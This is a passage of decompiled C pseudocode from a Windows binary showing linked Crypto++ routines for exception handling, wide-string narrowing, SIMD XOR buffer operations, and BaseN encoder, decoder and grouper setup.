        (*(void (__thiscall **)(char *))(*((_DWORD *)this - 1) + 116))(this - 4);
        *((_DWORD *)this + 13) = 0;
        *((_DWORD *)this + 14) = 5;
        goto LABEL_5;
      case 5:
LABEL_5:
        sub_45A380((_DWORD *)this - 1, a2, a3);
        *(_QWORD *)(this + 44) += a3;
        break;
      default:
        return;
    }
  }
}
// 45AA80: using guessed type char var_50[24];

//----- (0045AB70) --------------------------------------------------------
char *__thiscall sub_45AB70(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &std::bad_alloc::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4BC220: using guessed type void *std::bad_alloc::`vftable';

//----- (0045ABA0) --------------------------------------------------------
char *__thiscall sub_45ABA0(char *this)
{
  char *result; // eax

  result = this;
  *(_QWORD *)(this + 4) = 0i64;
  *((_DWORD *)this + 1) = "bad allocation";
  *(_DWORD *)this = &std::bad_alloc::`vftable';
  return result;
}
// 4BC220: using guessed type void *std::bad_alloc::`vftable';

//----- (0045ABE0) --------------------------------------------------------
_DWORD *__thiscall sub_45ABE0(_DWORD *this, char a2)
{
  *this = &std::exception::`vftable';
  __std_exception_destroy(this + 1);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 483827: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';

//----- (0045AC10) --------------------------------------------------------
int __cdecl sub_45AC10(int a1)
{
  int result; // eax
  void (__cdecl *v2)(); // eax
  void (*v3)(void); // esi
  char pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF

  for ( result = sub_494CF2(a1, 16); !result; result = sub_494CF2(a1, 16) )
  {
    v2 = std::set_new_handler(0);
    v3 = v2;
    if ( !v2 )
    {
      sub_45ABA0(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
    std::set_new_handler(v2);
    v3();
  }
  return result;
}
// 46B421: using guessed type void (__cdecl *__cdecl std::set_new_handler(void (__cdecl *)()))();

//----- (0045AC80) --------------------------------------------------------
int __cdecl sub_45AC80(int a1, wchar_t *Src, char a3)
{
  unsigned int v3; // eax
  char **v4; // eax
  char *v5; // eax
  unsigned int v6; // eax
  char *v7; // eax
  _DWORD *v8; // eax
  char **v9; // eax
  char **v10; // eax
  __int128 v11; // xmm0
  char *v13; // eax
  unsigned int MaxCountInBytes; // [esp+Ch] [ebp-88h]
  size_t PtNumOfCharConverted; // [esp+10h] [ebp-84h] BYREF
  char v16[24]; // [esp+14h] [ebp-80h] BYREF
  char v17[24]; // [esp+2Ch] [ebp-68h] BYREF
  char pExceptionObject[40]; // [esp+44h] [ebp-50h] BYREF
  char *Dst[4]; // [esp+6Ch] [ebp-28h] BYREF
  __int64 v20; // [esp+7Ch] [ebp-18h]
  int v21; // [esp+90h] [ebp-4h]

  v20 = 0xF00000000i64;
  LOBYTE(Dst[0]) = 0;
  v21 = 0;
  PtNumOfCharConverted = 0;
  MaxCountInBytes = 2 * wcslen(Src) + 2;
  v3 = wcstombs_s(&PtNumOfCharConverted, 0, 0, Src, MaxCountInBytes);
  if ( v3 )
  {
    if ( !a3 )
    {
LABEL_3:
      *(_DWORD *)(a1 + 16) = 0;
      *(_DWORD *)(a1 + 20) = 15;
      *(_BYTE *)a1 = 0;
      goto LABEL_23;
    }
    v13 = (char *)sub_435B30((int)v17, v3, 0xAu);
    LOBYTE(v21) = 1;
    v8 = (_DWORD *)sub_421FB0((int)v16, "StringNarrow: wcstombs_s() call failed with error ", v13);
    LOBYTE(v21) = 2;
LABEL_25:
    sub_405230(pExceptionObject, v8);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  if ( PtNumOfCharConverted > (unsigned int)v20 )
  {
    sub_41F0C0((char *)Dst, PtNumOfCharConverted - v20, 0);
  }
  else
  {
    v4 = Dst;
    LODWORD(v20) = PtNumOfCharConverted;
    if ( HIDWORD(v20) >= 0x10 )
      v4 = (char **)Dst[0];
    *((_BYTE *)v4 + PtNumOfCharConverted) = 0;
  }
  v5 = (char *)Dst;
  if ( HIDWORD(v20) >= 0x10 )
    v5 = Dst[0];
  v6 = wcstombs_s(&PtNumOfCharConverted, v5, PtNumOfCharConverted, Src, MaxCountInBytes);
  if ( v6 )
  {
    if ( !a3 )
      goto LABEL_3;
    v7 = (char *)sub_435B30((int)v16, v6, 0xAu);
    LOBYTE(v21) = 3;
    v8 = (_DWORD *)sub_421FB0((int)v17, "StringNarrow: wcstombs_s() call failed with error ", v7);
    LOBYTE(v21) = 4;
    goto LABEL_25;
  }
  if ( (_DWORD)v20 )
  {
    v9 = Dst;
    if ( HIDWORD(v20) >= 0x10 )
      v9 = (char **)Dst[0];
    if ( !*((_BYTE *)v9 + PtNumOfCharConverted - 1) )
    {
      if ( (unsigned int)v20 < PtNumOfCharConverted - 1 )
        sub_421040();
      LODWORD(v20) = PtNumOfCharConverted - 1;
      v10 = Dst;
      if ( HIDWORD(v20) >= 0x10 )
        v10 = (char **)Dst[0];
      *((_BYTE *)v10 + PtNumOfCharConverted - 1) = 0;
    }
  }
  v11 = *(_OWORD *)Dst;
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  *(_OWORD *)a1 = v11;
  LOBYTE(Dst[0]) = 0;
  *(_QWORD *)(a1 + 16) = v20;
  v20 = 0xF00000000i64;
LABEL_23:
  sub_4199E0(Dst);
  return a1;
}
// 421040: using guessed type void __noreturn sub_421040(void);

//----- (0045AEA0) --------------------------------------------------------
void *__cdecl sub_45AEA0(size_t Size)
{
  void *result; // eax
  void (__cdecl *v2)(); // eax
  void (*v3)(void); // esi
  char pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF

  for ( result = malloc(Size); !result; result = malloc(Size) )
  {
    v2 = std::set_new_handler(0);
    v3 = v2;
    if ( !v2 )
    {
      sub_45ABA0(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
    std::set_new_handler(v2);
    v3();
  }
  return result;
}
// 46B421: using guessed type void (__cdecl *__cdecl std::set_new_handler(void (__cdecl *)()))();

//----- (0045AF10) --------------------------------------------------------
bool __cdecl sub_45AF10(int a1, __m128i *a2, unsigned int a3)
{
  __m128i *v3; // eax
  char v4; // dl
  unsigned int v5; // ecx
  int v6; // ebx
  unsigned int v7; // edi
  unsigned int v8; // esi
  __m128i *v9; // eax
  __m128i v10; // xmm3
  __m128i v11; // xmm2
  __m128i v12; // xmm0
  __m128i v13; // xmm1
  __m128i v14; // xmm2
  __m128i v15; // xmm2
  __int8 *v16; // edx
  int v17; // ebx
  unsigned int v18; // ebp
  int v19; // edi
  int v20; // eax
  int v21; // esi
  unsigned int v23; // edi
  __m128i v24; // xmm3
  __m128i v25; // xmm2
  __m128i v26; // xmm0
  __m128i v27; // xmm1
  __m128i v28; // xmm2
  __m128i v29; // xmm2
  __m128i v30; // xmm2
  __m128i v31; // xmm2
  int v32; // ebx
  __m128i *v33; // esi
  unsigned int v34; // ecx
  char v35; // al
  int v36; // [esp+10h] [ebp-8h]
  __m128i *v37; // [esp+14h] [ebp-4h]

  v3 = a2;
  v4 = 0;
  v5 = a3;
  v6 = a1;
  v37 = a2;
  if ( (a1 & 3) == 0 && ((unsigned __int8)a2 & 3) == 0 )
  {
    v36 = 0;
    v7 = a3 >> 2;
    v8 = 0;
    if ( a3 >> 2 )
    {
      if ( v7 >= 8 )
      {
        v9 = a2 + 1;
        v10 = 0i64;
        v11 = 0i64;
        do
        {
          v12 = v9[-1];
          v9 += 2;
          v13 = *(__m128i *)(a1 + 4 * v8);
          v8 += 8;
          v10 = _mm_or_si128(v10, _mm_xor_si128(v13, v12));
          v11 = _mm_or_si128(v11, _mm_xor_si128(*(__m128i *)((char *)&v9[-2] + a1 - (_DWORD)a2), v9[-2]));
        }
        while ( v8 < (v7 & 0xFFFFFFF8) );
        v3 = a2;
        v14 = _mm_or_si128(v11, v10);
        v15 = _mm_or_si128(v14, _mm_srli_si128(v14, 8));
        v36 = _mm_cvtsi128_si32(_mm_or_si128(v15, _mm_srli_si128(v15, 4)));
      }
      if ( v8 >= v7 )
      {
        v19 = v36;
      }
      else
      {
        v16 = &v3->m128i_i8[4 * v8];
        v17 = a1 - (_DWORD)v3;
        v18 = v7 - v8;
        v8 = a3 >> 2;
        v19 = v36;
        do
        {
          v20 = *(_DWORD *)&v16[v17];
          v16 += 4;
          v19 |= *((_DWORD *)v16 - 1) ^ v20;
          --v18;
        }
        while ( v18 );
        v6 = a1;
        v36 = v19;
      }
    }
    else
    {
      v19 = 0;
    }
    v21 = 4 * v8;
    v5 = a3 - v21;
    if ( a3 == v21 )
      return v19 == 0;
    v6 += v21;
    v37 = (__m128i *)((char *)a2 + v21);
    v3 = (__m128i *)((char *)a2 + v21);
    v4 = v36 | BYTE1(v36) | BYTE2(v36) | HIBYTE(v36);
  }
  v23 = 0;
  if ( v5 )
  {
    if ( v5 >= 0x20 )
    {
      v24 = 0i64;
      v25 = 0i64;
      do
      {
        v26 = *v3;
        v3 += 2;
        v24 = _mm_or_si128(v24, _mm_xor_si128(*(__m128i *)((char *)&v3[-2] + v6 - (_DWORD)v37), v26));
        v27 = *(__m128i *)(v6 + v23 + 16);
        v23 += 32;
        v25 = _mm_or_si128(v25, _mm_xor_si128(v27, v3[-1]));
      }
      while ( v23 < (v5 & 0xFFFFFFE0) );
      v28 = _mm_or_si128(v25, v24);
      v29 = _mm_or_si128(v28, _mm_srli_si128(v28, 8));
      v30 = _mm_or_si128(v29, _mm_srli_si128(v29, 4));
      v31 = _mm_or_si128(v30, _mm_srli_si128(v30, 2));
      v4 |= _mm_cvtsi128_si32(_mm_or_si128(v31, _mm_srli_si128(v31, 1)));
    }
    if ( v23 < v5 )
    {
      v32 = v6 - (_DWORD)v37;
      v33 = &v37[v23 / 0x10];
      v34 = v5 - v23;
      do
      {
        v35 = v33->m128i_i8[v32];
        v33 = (__m128i *)((char *)v33 + 1);
        v4 |= v33[-1].m128i_i8[15] ^ v35;
        --v34;
      }
      while ( v34 );
    }
  }
  return v4 == 0;
}

//----- (0045B110) --------------------------------------------------------
char __cdecl sub_45B110(unsigned int a1, unsigned int a2, unsigned int a3, unsigned int a4)
{
  unsigned int v4; // ecx
  int v5; // eax
  unsigned int v6; // ebx
  unsigned int v7; // edx
  unsigned int v8; // edi
  unsigned int v9; // ebp
  unsigned int v10; // esi
  unsigned int v11; // esi
  unsigned int v12; // eax
  __m128i v13; // xmm0
  __m128i v14; // xmm1
  __m128i v15; // xmm0
  __m128i v16; // xmm1
  __m128i v17; // xmm0
  __m128i v18; // xmm1
  __m128i v19; // xmm0
  __m128i v20; // xmm1
  unsigned int v21; // ecx
  unsigned int v22; // ebx
  unsigned int v23; // esi
  int v24; // eax
  int v25; // edi
  unsigned int v26; // edx
  unsigned int v27; // edi
  unsigned int v28; // esi
  unsigned int v29; // ebp
  __m128i *v30; // esi
  __m128i v31; // xmm0
  __m128i v32; // xmm1
  __m128i v33; // xmm0
  __m128i v34; // xmm1
  __m128i v35; // xmm0
  __m128i v36; // xmm1
  __m128i v37; // xmm0
  __m128i v38; // xmm1
  _BYTE *v39; // ecx
  unsigned int v40; // ebx
  unsigned int v41; // esi
  unsigned int v42; // edx
  char v43; // al
  unsigned int v45; // [esp+10h] [ebp-1Ch]
  unsigned int v46; // [esp+20h] [ebp-Ch]
  unsigned int v47; // [esp+24h] [ebp-8h]

  v4 = a1;
  v5 = a3;
  v6 = a2;
  if ( (a1 & 3) != 0 || (a2 & 3) != 0 || (a3 & 3) != 0 )
  {
    v26 = a4;
    v45 = a4;
LABEL_21:
    v27 = 0;
    if ( v26 )
    {
      if ( v26 >= 0x40 )
      {
        v28 = v26 + v4 - 1;
        if ( v4 > v26 + v5 - 1 || (v5 = a3, v28 < a3) )
        {
          if ( v4 > v26 + v6 - 1 || v28 < v6 )
          {
            v29 = v4 + 16;
            v30 = (__m128i *)a3;
            v47 = v6 + 48;
            do
            {
              v31 = *v30;
              v30 += 4;
              v29 += 64;
              v32 = _mm_xor_si128(*(__m128i *)((char *)&v30[-4] + v6 - a3), v31);
              v33 = v30[-3];
              *(__m128i *)((char *)&v30[-4] + a1 - a3) = v32;
              v34 = _mm_xor_si128(*(__m128i *)(v6 - a1 + v29 - 64), v33);
              v35 = v30[-2];
              *(__m128i *)(v29 - 64) = v34;
              v36 = _mm_xor_si128(*(__m128i *)(v47 + v27 - 16), v35);
              v37 = v30[-1];
              *(__m128i *)(v29 - 48) = v36;
              v38 = *(__m128i *)(v47 + v27);
              v27 += 64;
              *(__m128i *)(v29 - 32) = _mm_xor_si128(v38, v37);
            }
            while ( v27 < (v26 & 0xFFFFFFC0) );
            v26 = v45;
            v6 = a2;
          }
          v5 = a3;
        }
      }
      if ( v27 < v26 )
      {
        v39 = (_BYTE *)(v27 + v5);
        v40 = v6 - v5;
        v41 = a1 - v5;
        v42 = v26 - v27;
        do
        {
          v43 = v39[v40];
          LOBYTE(v5) = *v39++ ^ v43;
          v39[v41 - 1] = v5;
          --v42;
        }
        while ( v42 );
      }
    }
    return v5;
  }
  v7 = a4;
  v8 = 0;
  v9 = a4 >> 2;
  if ( a4 >> 2 )
  {
    if ( v9 >= 0x10 )
    {
      v10 = a1 - 4 + 4 * v9;
      if ( a1 > a3 + 4 * v9 - 4 || (v5 = a3, v10 < a3) )
      {
        if ( a1 > a2 - 4 + 4 * v9 || v10 < a2 )
        {
          v11 = a3 + 16;
          v12 = a1 + 32;
          do
          {
            v13 = *(__m128i *)(v11 - 16);
            v11 += 64;
            v12 += 64;
            v14 = _mm_xor_si128(*(__m128i *)(a2 + 4 * v8), v13);
            v15 = *(__m128i *)(v11 - 64);
            *(__m128i *)(v12 - 96) = v14;
            v16 = _mm_xor_si128(*(__m128i *)(a2 - a3 + v11 - 64), v15);
            v17 = *(__m128i *)(v11 - 48);
            *(__m128i *)(v11 + a1 - a3 - 64) = v16;
            v4 = a1;
            v18 = _mm_xor_si128(*(__m128i *)(a2 - a1 + v12 - 64), v17);
            v19 = *(__m128i *)(v11 - 32);
            *(__m128i *)(v12 - 64) = v18;
            v20 = *(__m128i *)(a2 + 4 * v8 + 48);
            v8 += 16;
            *(__m128i *)(v12 - 48) = _mm_xor_si128(v20, v19);
          }
          while ( v8 < (v9 & 0xFFFFFFF0) );
          v7 = a4;
          v9 = a4 >> 2;
        }
        v5 = a3;
      }
    }
    if ( v8 < v9 )
    {
      v21 = v5 + 4 * v8;
      v46 = a2 - v5;
      v22 = a1 - v5;
      v23 = v9 - v8;
      v8 = v9;
      do
      {
        v24 = *(_DWORD *)(v21 + v46);
        v21 += 4;
        v5 = *(_DWORD *)(v21 - 4) ^ v24;
        *(_DWORD *)(v21 + v22 - 4) = v5;
        --v23;
      }
      while ( v23 );
      v6 = a2;
      v4 = a1;
    }
  }
  v25 = 4 * v8;
  v26 = v7 - v25;
  v45 = v26;
  if ( v26 )
  {
    v4 += v25;
    v6 += v25;
    a1 = v4;
    v5 = v25 + a3;
    a2 = v6;
    a3 += v25;
    goto LABEL_21;
  }
  return v5;
}

//----- (0045B3B0) --------------------------------------------------------
void __cdecl sub_45B3B0(unsigned int a1, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // ecx
  unsigned int v4; // ebx
  unsigned int v5; // edx
  unsigned int v6; // edi
  unsigned int v7; // ebp
  unsigned int v8; // esi
  unsigned int v9; // eax
  __m128i v10; // xmm0
  __m128i v11; // xmm0
  unsigned int v12; // ecx
  unsigned int v13; // ebx
  unsigned int v14; // esi
  int v15; // eax
  int v16; // edi
  unsigned int v17; // edx
  unsigned int v18; // ecx
  __m128i *v19; // eax
  __m128i v20; // xmm0
  __m128i v21; // xmm1
  unsigned int v22; // ebx
  _BYTE *v23; // eax
  unsigned int v24; // edx
  char v25; // cl

  v3 = a1;
  v4 = a2;
  if ( (a1 & 3) != 0 || (a2 & 3) != 0 )
  {
    v17 = a3;
LABEL_17:
    v18 = 0;
    if ( v17 )
    {
      if ( v17 >= 0x40 && (a1 > v17 + v4 - 1 || v17 + a1 - 1 < v4) )
      {
        v19 = (__m128i *)a1;
        do
        {
          v20 = *v19;
          v19 += 4;
          v19[-4] = _mm_xor_si128(*(__m128i *)((char *)&v19[-4] + v4 - a1), v20);
          v19[-3] = _mm_xor_si128(*(__m128i *)(v4 + v18 + 16), v19[-3]);
          v19[-2] = _mm_xor_si128(*(__m128i *)(v4 + v18 + 32), v19[-2]);
          v21 = *(__m128i *)(v4 + v18 + 48);
          v18 += 64;
          v19[-1] = _mm_xor_si128(v21, v19[-1]);
        }
        while ( v18 < (v17 & 0xFFFFFFC0) );
      }
      if ( v18 < v17 )
      {
        v22 = v4 - a1;
        v23 = (_BYTE *)(v18 + a1);
        v24 = v17 - v18;
        do
        {
          v25 = v23[v22];
          *v23++ ^= v25;
          --v24;
        }
        while ( v24 );
      }
    }
    return;
  }
  v5 = a3;
  v6 = 0;
  v7 = a3 >> 2;
  if ( a3 >> 2 )
  {
    if ( v7 >= 0x10 && (a1 > a2 - 4 + 4 * v7 || a1 - 4 + 4 * v7 < a2) )
    {
      v8 = a2 + 48;
      v9 = a1 + 16;
      v5 = a3;
      do
      {
        v10 = *(__m128i *)(v9 - 16);
        v6 += 16;
        v9 += 64;
        v8 += 64;
        *(__m128i *)(v9 - 80) = _mm_xor_si128(*(__m128i *)(v8 - 112), v10);
        *(__m128i *)(v9 - 64) = _mm_xor_si128(*(__m128i *)(a2 - a1 + v9 - 64), *(__m128i *)(v9 - 64));
        v11 = *(__m128i *)(v8 - 64);
        *(__m128i *)(v9 - 48) = _mm_xor_si128(*(__m128i *)(v8 - 80), *(__m128i *)(v9 - 48));
        *(__m128i *)(v9 - 32) = _mm_xor_si128(*(__m128i *)(v9 - 32), v11);
      }
      while ( v6 < (v7 & 0xFFFFFFF0) );
      v4 = a2;
    }
    if ( v6 < v7 )
    {
      v12 = a1 + 4 * v6;
      v13 = v4 - a1;
      v14 = v7 - v6;
      v6 = a3 >> 2;
      do
      {
        v15 = *(_DWORD *)(v12 + v13);
        v12 += 4;
        *(_DWORD *)(v12 - 4) ^= v15;
        --v14;
      }
      while ( v14 );
      v4 = a2;
      v3 = a1;
    }
  }
  v16 = 4 * v6;
  v17 = v5 - v16;
  if ( v17 )
  {
    v4 += v16;
    a1 = v16 + v3;
    goto LABEL_17;
  }
}

//----- (0045B570) --------------------------------------------------------
int __thiscall sub_45B570(void *this, void *a2, const char *a3, int a4)
{
  int result; // eax
  char *v5; // eax
  char *v6; // eax
  char *v7; // eax
  _DWORD *v8; // eax
  char v9[24]; // [esp+Ch] [ebp-98h] BYREF
  char v10[24]; // [esp+24h] [ebp-80h] BYREF
  char v11[24]; // [esp+3Ch] [ebp-68h] BYREF
  char v12[24]; // [esp+54h] [ebp-50h] BYREF
  char pExceptionObject[40]; // [esp+6Ch] [ebp-38h] BYREF
  int v14; // [esp+A0h] [ebp-4h]

  result = (*(int (__thiscall **)(void *, const char *, int *, int))(*(_DWORD *)this + 4))(
             this,
             a3,
             &int `RTTI Type Descriptor',
             a4);
  if ( !(_BYTE)result )
  {
    v5 = (char *)sub_419B80((int)v12, a2);
    v14 = 0;
    v6 = (char *)sub_421F20((int)v11, v5, ": missing required parameter '");
    LOBYTE(v14) = 1;
    v7 = (char *)sub_421F20((int)v10, v6, a3);
    LOBYTE(v14) = 2;
    v8 = (_DWORD *)sub_421F20((int)v9, v7, "'");
    LOBYTE(v14) = 3;
    sub_405230(pExceptionObject, v8);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  return result;
}
// 4EE1D4: using guessed type int int `RTTI Type Descriptor';
// 45B570: using guessed type char var_50[24];
// 45B570: using guessed type char var_68[24];
// 45B570: using guessed type char var_80[24];
// 45B570: using guessed type char var_98[24];

//----- (0045B640) --------------------------------------------------------
void __thiscall sub_45B640(_DWORD *this, void *a2)
{
  int v3; // esi
  int v4; // edx
  char *v5; // eax
  char *v6; // eax
  char *v7; // eax
  _DWORD *v8; // eax
  char v9[24]; // [esp+10h] [ebp-C0h] BYREF
  char v10[24]; // [esp+28h] [ebp-A8h] BYREF
  char v11[24]; // [esp+40h] [ebp-90h] BYREF
  char pExceptionObject[40]; // [esp+58h] [ebp-78h] BYREF
  char v13[40]; // [esp+80h] [ebp-50h] BYREF
  _DWORD v14[6]; // [esp+A8h] [ebp-28h] BYREF
  int v15; // [esp+CCh] [ebp-4h]

  if ( !(*(unsigned __int8 (__thiscall **)(void *, const char *, const int **, _DWORD *))(*(_DWORD *)a2 + 4))(
          a2,
          "DecodingLookupArray",
          &int const * `RTTI Type Descriptor',
          this + 6) )
  {
    v5 = (char *)sub_419B80((int)v14, "BaseN_Decoder");
    v15 = 0;
    v6 = (char *)sub_421F20((int)v11, v5, ": missing required parameter '");
    LOBYTE(v15) = 1;
    v7 = (char *)sub_421F20((int)v10, v6, "DecodingLookupArray");
    LOBYTE(v15) = 2;
    v8 = (_DWORD *)sub_421F20((int)v9, v7, "'");
    LOBYTE(v15) = 3;
    sub_405230(v13, v8);
    _CxxThrowException(v13, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  sub_45B570(a2, "BaseN_Decoder", "Log2Base", (int)(this + 7));
  v3 = this[7];
  if ( (unsigned int)(v3 - 1) > 6 )
  {
    sub_419B80((int)v14, "BaseN_Decoder: Log2Base must be between 1 and 7 inclusive");
    v15 = 4;
    sub_405230(pExceptionObject, v14);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v4 = this[7];
  this[10] = 0;
  this[9] = 0;
  if ( v3 % 8 )
  {
    do
      v4 += v3;
    while ( v4 % 8 );
  }
  this[8] = v4 / 8;
  sub_418EE0(this + 11, v4 / 8);
}
// 4EE008: using guessed type const int *int const * `RTTI Type Descriptor';
// 45B640: using guessed type _DWORD var_28[6];
// 45B640: using guessed type char var_90[24];
// 45B640: using guessed type char var_A8[24];
// 45B640: using guessed type char var_C0[24];

//----- (0045B7C0) --------------------------------------------------------
void __thiscall sub_45B7C0(_DWORD *this, void *a2)
{
  int v3; // eax
  int v4; // esi
  int v5; // ecx
  char *v6; // eax
  char *v7; // eax
  char *v8; // eax
  char *v9; // eax
  unsigned __int8 v10; // [esp+12h] [ebp-9Ah] BYREF
  char v11; // [esp+13h] [ebp-99h] BYREF
  char v12[24]; // [esp+14h] [ebp-98h] BYREF
  char v13[24]; // [esp+2Ch] [ebp-80h] BYREF
  char v14[24]; // [esp+44h] [ebp-68h] BYREF
  char pExceptionObject[40]; // [esp+5Ch] [ebp-50h] BYREF
  char v16[24]; // [esp+84h] [ebp-28h] BYREF
  int v17; // [esp+A8h] [ebp-4h]

  if ( !(*(unsigned __int8 (__thiscall **)(void *, const char *, const unsigned __int8 **, _DWORD *))(*(_DWORD *)a2 + 4))(
          a2,
          "EncodingLookupArray",
          &unsigned char const * `RTTI Type Descriptor',
          this + 6) )
  {
    v7 = (char *)sub_419B80((int)v16, "BaseN_Encoder");
    v17 = 0;
    v8 = (char *)sub_421F20((int)v14, v7, ": missing required parameter '");
    LOBYTE(v17) = 1;
    v9 = (char *)sub_421F20((int)v13, v8, "EncodingLookupArray");
    LOBYTE(v17) = 2;
    v6 = (char *)sub_421F20((int)v12, v9, "'");
    LOBYTE(v17) = 3;
LABEL_13:
    sub_405230(pExceptionObject, v6);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  sub_45B570(a2, "BaseN_Encoder", "Log2Base", (int)(this + 8));
  if ( (unsigned int)(this[8] - 1) > 6 )
  {
    sub_419B80((int)v16, "BaseN_Encoder: Log2Base must be between 1 and 7 inclusive");
    v17 = 4;
    v6 = v16;
    goto LABEL_13;
  }
  if ( (*(unsigned __int8 (__thiscall **)(void *, const char *, unsigned __int8 *, unsigned __int8 *))(*(_DWORD *)a2 + 4))(
         a2,
         "PaddingByte",
         &unsigned char `RTTI Type Descriptor',
         &v10)
    && (!(*(unsigned __int8 (__thiscall **)(void *, const char *, bool *, char *))(*(_DWORD *)a2 + 4))(
           a2,
           "Pad",
           &bool `RTTI Type Descriptor',
           &v11)
     || v11) )
  {
    v3 = v10;
  }
  else
  {
    v3 = -1;
  }
  v4 = this[8];
  v5 = 8;
  this[7] = v3;
  this[11] = 0;
  for ( this[10] = 0; v5 % v4; v5 += 8 )
    ;
  this[9] = v5 / v4;
  sub_418EE0(this + 12, v5 / v4);
}
// 4E90D0: using guessed type const unsigned __int8 *unsigned char const * `RTTI Type Descriptor';
// 4E9190: using guessed type unsigned __int8 unsigned char `RTTI Type Descriptor';
// 4ED864: using guessed type bool bool `RTTI Type Descriptor';
// 45B7C0: using guessed type char var_68[24];
// 45B7C0: using guessed type char var_80[24];
// 45B7C0: using guessed type char var_98[24];

//----- (0045B970) --------------------------------------------------------
void __thiscall sub_45B970(_DWORD *this, int *a2)
{
  char v3; // al
  int v4; // ecx
  int v5; // eax
  unsigned __int8 (__thiscall *v6)(int *, const char *, void *, char *); // eax
  size_t v7; // eax
  void *v8; // ecx
  size_t v9; // eax
  void *v10; // ecx
  unsigned int v11; // ecx
  void *v12; // edx
  unsigned int v13; // ecx
  void *v14; // edx
  char *v15; // eax
  char *v16; // eax
  char *v17; // eax
  _DWORD *v18; // eax
  int v19; // [esp+Ch] [ebp-48h] BYREF
  char v20[4]; // [esp+10h] [ebp-44h] BYREF
  void *v21; // [esp+14h] [ebp-40h]
  size_t v22; // [esp+18h] [ebp-3Ch]
  unsigned int v23; // [esp+20h] [ebp-34h]
  unsigned int v24; // [esp+24h] [ebp-30h]
  void *Block; // [esp+28h] [ebp-2Ch]
  char v26[4]; // [esp+2Ch] [ebp-28h] BYREF
  void *v27; // [esp+30h] [ebp-24h]
  size_t v28; // [esp+34h] [ebp-20h]
  unsigned int v29; // [esp+3Ch] [ebp-18h]
  unsigned int v30; // [esp+40h] [ebp-14h]
  void *v31; // [esp+44h] [ebp-10h]
  int v32; // [esp+50h] [ebp-4h]
  char v33[24]; // [esp+54h] [ebp+0h] BYREF
  char v34[24]; // [esp+6Ch] [ebp+18h] BYREF
  char v35[24]; // [esp+84h] [ebp+30h] BYREF
  char v36[24]; // [esp+9Ch] [ebp+48h] BYREF
  char pExceptionObject[40]; // [esp+B4h] [ebp+60h] BYREF

  v3 = (*(int (__thiscall **)(int *, const char *, int *, int *))(*a2 + 4))(
         a2,
         "GroupSize",
         &int `RTTI Type Descriptor',
         &v19);
  v4 = 0;
  v29 = -1;
  v30 = 0;
  v31 = 0;
  if ( v3 )
    v4 = v19;
  this[14] = v4;
  v27 = 0;
  v28 = 0;
  v26[0] = 0;
  v32 = 2;
  v23 = -1;
  v24 = 0;
  Block = 0;
  v21 = 0;
  v22 = 0;
  v20[0] = 0;
  v5 = *a2;
  LOBYTE(v32) = 5;
  v6 = *(unsigned __int8 (__thiscall **)(int *, const char *, void *, char *))(v5 + 4);
  if ( v4 )
  {
    if ( !v6(a2, "Separator", &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor', v26) )
    {
      v15 = (char *)sub_419B80((int)v36, "Grouper");
      LOBYTE(v32) = 6;
      v16 = (char *)sub_421F20((int)v35, v15, ": missing required parameter '");
      LOBYTE(v32) = 7;
      v17 = (char *)sub_421F20((int)v34, v16, "Separator");
      LOBYTE(v32) = 8;
      v18 = (_DWORD *)sub_421F20((int)v33, v17, "'");
      LOBYTE(v32) = 9;
      sub_405230(pExceptionObject, v18);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
  }
  else
  {
    v6(a2, "Separator", &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor', v26);
  }
  (*(void (__thiscall **)(int *, const char *, void *, char *))(*a2 + 4))(
    a2,
    "Terminator",
    &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor',
    v20);
  if ( v26[0] )
  {
    v7 = v30;
    v8 = v31;
  }
  else
  {
    v7 = v28;
    v8 = v27;
  }
  sub_418F60(this + 6, v8, v7);
  if ( v20[0] )
  {
    v9 = v24;
    v10 = Block;
  }
  else
  {
    v9 = v22;
    v10 = v21;
  }
  sub_418F60(this + 10, v10, v9);
  this[15] = 0;
  v11 = v24;
  v12 = Block;
  if ( v23 < v24 )
    v11 = v23;
  LOBYTE(v32) = 10;
  memset(Block, 0, v11);
  j_j___free_base(v12);
  v13 = v30;
  v14 = v31;
  if ( v29 < v30 )
    v13 = v29;
  v32 = 11;
  memset(v31, 0, v13);
  j_j___free_base(v14);
}
// 4EE1D4: using guessed type int int `RTTI Type Descriptor';
// 45B970: using guessed type char var_B4[4];
// 45B970: using guessed type char var_D0[4];
// 45B970: using guessed type char var_44[24];
// 45B970: using guessed type char var_5C[24];
// 45B970: using guessed type char var_74[24];
// 45B970: using guessed type char var_8C[24];

//----- (0045BB80) --------------------------------------------------------
int __thiscall sub_45BB80(_DWORD *this, int a2, unsigned int a3, int a4, int a5)
{
  int v6; // ecx
  int v7; // eax
  int v8; // eax
  int result; // eax
  unsigned int v10; // edx
  unsigned int v11; // ebx
  int v12; // eax
  _BYTE *v13; // edi
  int v14; // edx
  int v15; // eax
  int v16; // eax

  v6 = a4;
  v7 = this[5];
  if ( !v7 )
  {
